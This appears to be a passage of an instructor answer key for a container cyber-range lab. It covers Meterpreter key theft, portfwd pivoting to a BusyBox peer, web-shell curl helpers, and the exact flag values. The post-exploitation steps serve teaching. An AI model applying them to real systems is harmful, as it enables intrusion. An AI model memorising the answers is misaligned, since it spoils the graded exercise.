download /opt/ops/ssh-materials/id_peer_ops /tmp/id_peer_ops
download /opt/ops/ssh-materials/config /tmp/lab31-peer-ssh-config
```

From an ops-station shell:

```
chmod 600 /tmp/id_peer_ops
ssh -i /tmp/id_peer_ops \
  -p 2222 \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  opspeer@127.0.0.1
```

Why `127.0.0.1:2222`: the forward listens on the ops station; you are not talking to duck-31 host `:22` (that is host sshd, not the peer).

#### Accepted alternate — staged SSH client from a callback shell

If students used a reverse shell instead of Meterpreter, upload an approved static SSH client into `/run/exec-dropbox/uploads/` (same staging UI as other payloads), then from the callback shell after the same 7a hunt:

```
chmod 700 /run/exec-dropbox/uploads/ssh-client
/run/exec-dropbox/uploads/ssh-client -F /opt/ops/ssh-materials/config busybox-peer
```

Same discovered config; different tooling. Do not demo this path unless the Meterpreter/`portfwd` path is unavailable.

How students know this:

- SSH config/key paths came from Step 4 / 6b hints plus the Step 7a listing, not the handout.
- Missing `ssh` in `batch-runner` (Step 7a) forced redirections (`portfwd`) or a staged client.
- `HostName internal-shell` in the config is why `portfwd ... -r internal-shell` is justified.

Coaching prompts if stuck:

- "What connection material did the second runtime expose?"
- "Is `id_peer_ops` a password or a private key?"
- "Can the current runtime use that material directly?"
- "Why is ops-station SSH to the Docker host port 22 the wrong target for this key?"
- "How will your first command on the peer prove the transition succeeded?"

Grading checkpoint:

- Student documents discovered connection material, the limitation, the Meterpreter (or accepted alternate) adaptation, and context proof from the peer.

Transition (say aloud): Peer shell is open. First prove the constrained runtime with SA, then read objectives — applet target is the login shell name you are about to collect, not a brute-force of `busybox --list`.

### 8. Operate in the BusyBox peer

Guiding question for students:

> Which BusyBox behavior can you prove rather than assume?

Say first: SA shell name → objective notes → **run** helpers (never `cat` helpers for the flag).

After the peer shell opens, start with a normal constrained-environment survey before naming BusyBox:

```
uname -a
whoami
id
pwd
echo "$SHELL"
cat /etc/os-release 2>/dev/null || true
ps -p $$ -o pid,ppid,args=
ls -la /
ls -la /bin | sed -n '1,80p'
command -v sh
command -v ash || true
command -v busybox || true
ls -l /bin/sh /bin/ash /bin/busybox 2>/dev/null || true
readlink -f /bin/sh 2>/dev/null || true
readlink -f /bin/ash 2>/dev/null || true
readlink -f "$(command -v busybox)" 2>/dev/null || true
```

Constrained-environment survey notes:

- `echo "$SHELL"` shows the login shell advertised by the environment. On the default peer this is BusyBox `ash` — record that name; the applet objective later reuses it.
- `cat /etc/os-release` may reveal a small distribution such as Alpine, but students should not stop at distro name alone.
- `ps -p $$ -o pid,ppid,args=` confirms the current shell process after the peer transition.
- `ls -la /` and `ls -la /bin` show whether the filesystem and binary set look minimal.
- `command -v sh`, `command -v ash`, and `command -v busybox` identify what shell and utility dispatcher binaries are available.
- `ls -l /bin/sh /bin/ash /bin/busybox` shows whether shell paths are real binaries or links.
- `readlink -f` resolves links to their final targets. If common commands or shell paths resolve to `/bin/busybox`, students can conclude this is a BusyBox-style environment from evidence rather than from the instructor telling them.

Expected conclusion:

- Students should observe a minimal peer runtime with `/bin/busybox` present.
- Shell or utility paths may resolve to BusyBox; the login shell should be BusyBox `ash`.
- Record that shell name now. It is the applet candidate for the objective notes — not something to rediscover by brute-forcing `busybox --list`.
- This justifies using BusyBox-specific enumeration such as `busybox --list` as confirmation only.

Once students can justify the BusyBox conclusion, continue the objective survey manually:

```
ls -la /home/opspeer/objectives
cat /home/opspeer/objectives/peer-network.txt
cat /home/opspeer/objectives/applet-notes.txt
cat /home/opspeer/objectives/multicall-notes.txt
# Revisit SA baseline identity from the peer survey above:
echo "$SHELL"
ps -p $$ -o pid,ppid,args=
command -v ash
ls -l /bin/ash /bin/sh
readlink -f /bin/ash
readlink -f "$SHELL"
busybox --list
ls -la /home/opspeer/tools
/home/opspeer/tools/check-applet
/home/opspeer/tools/check-multicall
```

Manual survey notes:

- `ls -la /home/opspeer/objectives` identifies the objective files before reading them.
- The objective notes are read before helper execution so students understand what they are validating.
- Applet notes tell students to reuse the login-shell name already collected in the peer SA baseline, not to brute-force `busybox --list`.
- `echo "$SHELL"`, `ps -p $$`, `command -v ash`, and `readlink -f` restate that this session is BusyBox `ash`. That session identity is why `ash` is the applet candidate.
- `busybox --list` only confirms the named shell applet exists on this build (intersection check).
- `ls -la /home/opspeer/tools` shows helper scripts, gate tokens (`.applet.token` / `.multicall.token`), and alias files (`ops-ls`, `ops-echo`, `ops-ps`).
- Pre-execution inspection is usage-only: run each helper with no arguments. Do **not** treat `cat` of the helpers as the flag path. Tokens are hash + base64 obfuscation (BusyBox-native; no openssl); helpers print the flag only on a successful match.

Expected `/home/opspeer/objectives/peer-network.txt` output:

```
peer_network_flag=HOLLOW-TRANSIT
```

Expected `/home/opspeer/objectives/applet-notes.txt` output:

```
Objective: identify the expected BusyBox applet and validate it with /home/opspeer/tools/check-applet.
Hint: your peer SA baseline already named your login shell; confirm that name appears in busybox --list, then validate it (do not brute-force the applet list).
```

Expected `/home/opspeer/objectives/multicall-notes.txt` output:

```
Objective: prove BusyBox multicall behavior on the expected alias and validate it with /home/opspeer/tools/check-multicall.
Hint: inspect links in /home/opspeer/tools, prove they resolve to /bin/busybox, then validate the directory-listing alias among that small set.
```

Expected helper usage snippets:

```
usage: check-applet <applet-name>
usage: check-multicall <full-path-to-alias>
```

Narrow the applet target from SA baseline evidence, then validate by running the helper:

```
# From peer SA: login shell is ash (basename of $SHELL / args from ps).
basename "$SHELL"
# Confirm it is a BusyBox applet on this host (scan list already printed):
# busybox --list | grep -qx ash && echo listed

command -v ash
ls -l /bin/ash
readlink -f /bin/ash

# Optional wrong trial first: a listed applet that is not the login shell.
/home/opspeer/tools/check-applet cat
# Expected: result=valid-applet-but-not-target

# Correct validation: the helper must be run; cat of the script does not print the flag.
/home/opspeer/tools/check-applet ash
```

How students know `ash`:

- `applet-notes.txt` forbids brute-forcing `busybox --list` and points back to the peer SA baseline login shell.
- Step 8 opening survey already collected `echo "$SHELL"` / `ps -p $$` / `command -v ash`. On the default peer that shell is `ash` (or `/bin/ash`).
- `busybox --list` confirms `ash` is an applet here. `readlink -f /bin/ash` confirms it is BusyBox-backed — that is confirmation, not the reason `ash` was chosen over `sed`/`cat`.
- Wrong listed applets return `valid-applet-but-not-target`. Only the correct run prints `busybox_applet_flag=...`.

Narrow the multicall alias from the small tools set, then validate by running the helper:

```
ls -la /home/opspeer/tools
readlink -f /home/opspeer/tools/ops-ls
readlink -f /home/opspeer/tools/ops-echo
readlink -f /home/opspeer/tools/ops-ps

# All three aliases resolve to /bin/busybox, so symlink proof alone is not enough.
# multicall-notes: directory-listing alias among that set -> ops-ls.
# Optional wrong trial first:
/home/opspeer/tools/check-multicall /home/opspeer/tools/ops-echo
# Expected: result=multicall-confirmed-wrong-alias

/home/opspeer/tools/check-multicall /home/opspeer/tools/ops-ls
```

How students know `ops-ls`:

- `multicall-notes.txt` says prove multicall links, then pick the directory-listing alias from the small `/home/opspeer/tools` set.
- `ls` exposes `ops-ls`, `ops-echo`, `ops-ps`. `readlink -f` proves each links to `/bin/busybox`.
- Directory-listing maps to `ops-ls`. Wrong aliases return `multicall-confirmed-wrong-alias`. Only the correct run prints `busybox_multicall_flag=...`.

Expected helper success snippets:

```
busybox_applet_flag=KINETIC-ANCHOR
busybox_multicall_flag=MONOLITH-CHAIN
```

Expected wrong-value troubleshooting snippets:

```
result=valid-applet-but-not-target
result=multicall-confirmed-wrong-alias
```

Teaching point (why run the helpers):

- `peer-network.txt` is a readable objective file. The applet and multicall flags are not embedded in the helpers. Helpers match a target hash, then `base64 -d` the second token line.
- Reading `check-applet` / `check-multicall` does not print the flag or the target name. The intended recovery path is discovery + a successful helper run (not decoding the token by hand).

How students know this:

- Peer objective files tell students what to validate and point applet discovery at session shell identity from the SA baseline.
- `busybox --list` confirms the shell name is an applet; it is not a candidate dump to trial end-to-end.
- `ls -la /home/opspeer/tools` and `readlink -f` prove multicall links; the directory-listing hint selects `ops-ls` from three aliases.
- No-arg helper runs reveal usage. Wrong trials distinguish valid answers from the target answers before the success runs.

Coaching prompts if stuck:

- "What login shell did your peer SA baseline already name?"
- "Which command lists BusyBox applets, and what are you matching that list against?"
- "Why is trying every applet from busybox --list the wrong method here?"
- "What is the difference between a valid applet and the login-shell target?"
- "If every ops-* link resolves to /bin/busybox, which alias matches directory listing?"
- "If you can read the helper script, why does the flag still require a successful run?"

Grading checkpoint:

- Student recovers `peer_network_flag`, `busybox_applet_flag`, and `busybox_multicall_flag` while showing SA-baseline shell identity before applet validation (not applet-list brute force).

### 9. Close with the runtime-chain summary

Students should be able to conclude that they moved through at least:

- A tokenized web-shell entry on the Docker host
- A first containerized runtime (`web-gateway`) with planted process, file, and `/.dockerenv` artifacts
- An upload-and-execute handoff into a second runtime (`batch-runner`)
- A private-network pivot into a BusyBox-style peer (`internal-shell`)
- BusyBox-constrained discovery and validation rather than full GNU tooling

That is the chain this lab is trying to build: prove each runtime from evidence, adapt when tools are missing, and recover flags from native artifacts in each context.

## Troubleshooting and Confirmation

If a fresh Duck deploy does not match this key, the host repair commands are in B03 range host recovery (`course/operations/b03-range-host-recovery.md`).

### Token or Web UI Failure

Checks:

```
curl -i "http://20.30.40.31:8081/?t=ops_console_token" | sed -n '1,20p'
```

This is an instructor-only reachability check. Students still open the same URL in a browser.

Expected:

- HTTP `200` with the correct token.
- HTTP `403` when the token is wrong or omitted.

Instructor actions:

- Confirm `cs_ops::lab_3_1::compose::web_token` for the deployed build.
- Confirm Docker host port `8081` is reachable from the student ops station.

### Upload or Remote Execution Failure

Checks on the Docker host:

```
cd /opt/maintenance-stack/lab3
docker ps
ls -la /opt/maintenance-stack/lab3/exec-dropbox
ls -la /opt/maintenance-stack/lab3/exec-dropbox/uploads
ls -la /opt/maintenance-stack/lab3/exec-dropbox/requests
ls -la /opt/maintenance-stack/lab3/exec-dropbox/responses
```

Expected:

- `web-gateway`, `batch-runner`, and `internal-shell` are running.
- Uploaded payloads appear under the shared upload dropbox.
- Request and response files appear briefly during remote execution.

Instructor actions:

- Re-run the upload and execute steps with a small diagnostic payload.
- If `batch-runner` or `internal-shell` is not `Up`, run `docker start batch-runner internal-shell`. On this host all three containers use `restart=always`, so a reboot brings them back. A catalog deploy that has not had that `docker update` leaves the other two stopped; the repair is in B03 range host recovery (`course/operations/b03-range-host-recovery.md`).

### Meterpreter Callback or `portfwd` Failure

Checks from the ops station:

```
echo "$CALLBACK_IP:$CALLBACK_PORT"
ss -tulpen | grep "$CALLBACK_PORT" || true
```

Confirm the multi/handler is waiting before upload/execute. Expected upload response: `meterpreter_launched` (or `reverse_shell_launched` on the accepted alternate).

Instructor actions:

- Use an ops-station IP reachable from the container network; do not use `127.0.0.1` for `LHOST` unless the handler shares that network namespace.
- Confirm host firewall rules allow the callback port.
- If Meterpreter opens and immediately dies, regenerate with matching arch/`LHOST`/`LPORT` and keep `PrependFork=true`.
- If `portfwd` is set but SSH fails: `portfwd list`, confirm `-r internal-shell` (from Step 7a config), and that ops-station `ssh` uses `127.0.0.1` and `-p 2222` (local forward), not duck-31 host `:22`.
- Fall back to the reverse-shell + staged SSH alternate only if the Meterpreter path cannot be recovered mid-demo.

### Missing Mounted Artifacts

Checks from the Meterpreter `shell` in `batch-runner` (or remote execute if no session yet):

```
ls -la /srv
ls -la /srv/archive
ls -la /srv/archive/reports
mount | sed -n '1,50p'
```

Expected:

- `/srv/archive` is mounted read-only from host-managed data.
- `maintenance-readme.txt` is present under the reports directory.

Instructor action:

- Confirm Puppet rendered `host-data/reports/maintenance-readme.txt` and the Compose volume maps it to `/srv/archive:ro`.

### Missing SSH Client in `batch-runner`

Check from the Meterpreter `shell` (Step 7a):

```
command -v ssh || echo "ssh not found"
```

Expected:

```
ssh not found
```

Instructor action:

- This is intended. On the demo path, adapt with Meterpreter `portfwd` (Step 7b), not more one-shot uploads.

### SSH Key or Config Failure

Checks from the Meterpreter `shell` (Step 7a):

```
ls -la /opt/ops/ssh-materials
cat /opt/ops/ssh-materials/config
```

Expected:

- Private key exists at the configured identity path.
- Config names `busybox-peer`, `internal-shell`, `opspeer`, and port `22`.

Instructor actions:

- On the demo path: confirm Meterpreter `download` of `id_peer_ops`, `chmod 600`, and `ssh -i ... -p 2222 opspeer@127.0.0.1`.
- On the staged-client alternate: confirm the uploaded client is executable and uses `-F /opt/ops/ssh-materials/config busybox-peer`.

If peer SSH still fails with a matching key, check peer sshd logs on the Docker host:

```
docker logs internal-shell 2>&1 | tail -40
docker exec internal-shell grep '^opspeer:' /etc/shadow
```

If logs show `User opspeer not allowed because account is locked`, Alpine `adduser -D` left `!` in shadow and OpenSSH rejects locked accounts even for pubkey. Unlock for pubkey-only (no password) and retest:

```
docker exec internal-shell sed -i 's/^opspeer:!\+[^:]*:/opspeer:*:/' /etc/shadow
docker exec internal-shell grep '^opspeer:' /etc/shadow
```

Permanent fix is in the peer `Dockerfile` / `start-peer.sh` (replace locked `!` with `*`). Rebuild/restart the peer after deploying that change.

### BusyBox Validation Failure

Checks on peer:

```
echo "$SHELL"
basename "$SHELL"
busybox --list | sed -n '1,40p'
ls -la /home/opspeer/tools
readlink -f /home/opspeer/tools/ops-ls
/home/opspeer/tools/check-applet
/home/opspeer/tools/check-multicall
command -v base64
command -v sha256sum
ls -l /home/opspeer/tools/.applet.token /home/opspeer/tools/.multicall.token
```

Expected:

- Login shell basename is `ash` on the default peer (or the Hiera-rotated `APPLET_DISCOVERY_TARGET`).
- Applet list includes that shell name.
- Tool aliases resolve to `/bin/busybox`.
- Helpers print usage when called without required arguments.
- Gate token files exist (line1 = target hash, line2 = base64 flag); `cat` of helpers does not print plaintext flags.
- `base64` and `sha256sum` are available (BusyBox applets; no openssl/apk add).

Instructor action:

- Prompt students to show login-shell identity from the SA baseline before helper validation.
- If helpers error on missing `base64`/`sha256sum`, the peer image is unexpected — rebuild from the current `busybox/` context (should reuse cached Alpine layers offline).
- If `check-applet ash` fails but `sed` used to work, the peer is still on the old target — remint tokens for `ash` or rebuild.

### Reset Exercise Artifacts

On the Docker host:

```
cd /opt/maintenance-stack/lab3
rm -f /opt/maintenance-stack/lab3/exec-dropbox/uploads/*
rm -f /opt/maintenance-stack/lab3/exec-dropbox/requests/*.job
rm -f /opt/maintenance-stack/lab3/exec-dropbox/responses/*.out
rm -f /opt/maintenance-stack/lab3/bridge-dropbox/requests/*.job
rm -f /opt/maintenance-stack/lab3/bridge-dropbox/responses/*.out
docker restart web-gateway batch-runner internal-shell
```

## Grading Checkpoints

1. Student proves initial web-shell runtime context before collecting flags.
2. Student recovers all three first-runtime objectives from process, file-activity, and environment evidence.
3. Student demonstrates upload-and-execute remote execution and identifies what proves the context changed.
4. Student establishes interactive control in the second runtime (Meterpreter preferred; reverse shell accepted).
5. Student recovers all three exec-runtime objectives with discoverable evidence for each target path or request.
6. Student discovers SSH/pivot material and documents why adaptation is required.
7. Student reaches the BusyBox peer or presents equivalent evidence through an approved pivot path.
8. Student recovers `peer_network_flag` from peer artifacts.
9. Student recovers `busybox_applet_flag` via login-shell SA identity plus helper validation (`ash` by default).
10. Student recovers `busybox_multicall_flag` via symlink/multicall proof plus helper validation.

## Acceptable Answers

- Equivalent command sequences are valid if they demonstrate the same evidence.
- Any workable payload family is acceptable for the remote execution objective.
- Any approved pivot method is acceptable when justified from discovered artifacts and reaches the peer. Instructor demo preference is Meterpreter + `portfwd`; reverse shell + staged SSH remains an accepted alternate.
- For BusyBox applet objectives, require evidence that students used peer SA login-shell identity (not brute-forcing `busybox --list` or helper inputs).
- For BusyBox multicall objectives, require symlink proof plus selection among the small `ops-*` set (directory-listing alias by default).
- Require exact flag value matches for the deployed build unless the rubric permits rotated-value credit with command evidence.

## Appendix: optional curl helpers

Students are graded on the browser path. Instructors who already use `curl` may use these helpers instead of clicking the forms. They post the same fields the UI uses.

```
TARGET='20.30.40.31'
TOKEN='ops_console_token'
BASE="http://${TARGET}:8081/?t=${TOKEN}"

lab31_ui() {
  curl -fsS "$BASE"
}

lab31_probe() {
  curl -i "$BASE"
}

lab31_run() {
  local cmd="$*"
  curl -fsS -X POST "$BASE" \
    --data-urlencode 'action=run_local' \
    --data-urlencode "cmd=${cmd}"
}

lab31_upload() {
  local src="$1"
  local remote_name="${2:-$(basename "$src")}"
  curl -fsS -X POST "$BASE" \
    -F 'action=upload_remote' \
    -F "upload=@${src};filename=${remote_name}"
}

lab31_exec() {
  local remote_file="$1"
  shift || true
  local remote_args="${*:-}"
  curl -fsS -X POST "$BASE" \
    -d 'action=execute_remote' \
    --data-urlencode "remote_file=${remote_file}" \
    --data-urlencode "remote_args=${remote_args}"
}
```

Form fields (for mapping UI clicks to `curl` only):

- Local Command: `action=run_local`, `cmd=`
- Upload: `action=upload_remote`, file field `upload`
- Remote execute: `action=execute_remote`, `remote_file=`, `remote_args=`